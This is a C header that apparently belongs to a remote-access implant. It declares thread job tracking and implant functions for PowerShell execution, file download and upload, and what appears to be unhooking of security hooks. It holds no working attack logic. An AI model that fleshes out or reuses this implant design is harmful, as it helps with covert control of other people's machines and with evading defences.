#pragma once

#define MAX_JOBS 64

#define JOB_ACTIVE 1
#define JOB_NOT    0

struct job_t {
    uint8_t active;
    HANDLE* job_thread;

    uint8_t progress;
};

struct jobs_t {
    CRITICAL_SECTION jobs_cs;
    struct job_t jobs[MAX_JOBS];

    HANDLE* main_thread_handle;
};

struct wrkr_trans_t {
    tremont_stream_id stream_id;
    Tremont_Nexus* nexus;
};

int track_job(HANDLE* job_thread, struct jobs_t* jobs);

void untrack_job(HANDLE* job_thread, struct jobs_t* jobs);

uint32_t calc_percentage(int num, int denom);

void implant_powershell(tremont_stream_id stream_id,
	Tremont_Nexus* nexus);

int implant_download(struct wrkr_trans_t* trans, 
    struct download_req_t* req);

int implant_upload(struct wrkr_trans_t* trans,
    struct upload_req_t* req);

int implant_unhookl(struct wrkr_trans_t* trans,
    struct unhookl_req_t* req);